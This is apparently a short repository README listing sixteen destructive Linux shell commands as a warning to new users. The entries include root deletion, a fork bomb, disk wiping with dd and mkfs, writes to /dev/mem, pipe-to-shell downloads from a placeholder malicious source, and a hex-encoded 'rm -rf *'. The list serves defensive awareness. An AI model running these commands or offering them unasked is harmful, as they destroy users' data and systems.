# dangerous-shell-commands
List of dangerous shell commands to prevent new linux users to get tricked by trolls. Feel free to contribute
# List
1. rm -rf /*
2. :(){ :|: & };:
3. mkfs /dev/sda1 
4. cat /dev/zero > /dev/sda1
5. wget url -O - | sh --
6. curl url | sh
7. dd if=/dev/zero of=/dev/sda2
8. echo 726d202d7266202a | xxd -r -p
9. dd if=/dev/random of=/dev/port
10. echo 1 > /proc/sys/kernel/panic
11. cat /dev/port or cat /dev/mem
12. cat /dev/zero > /dev/mem
13. sudo chmod -r 444 / or sudo chown -r nobody:nobody /
14. last | reboot
15. mv /home/user/* /dev/null
16. wget http://malicious_source -O- | sh
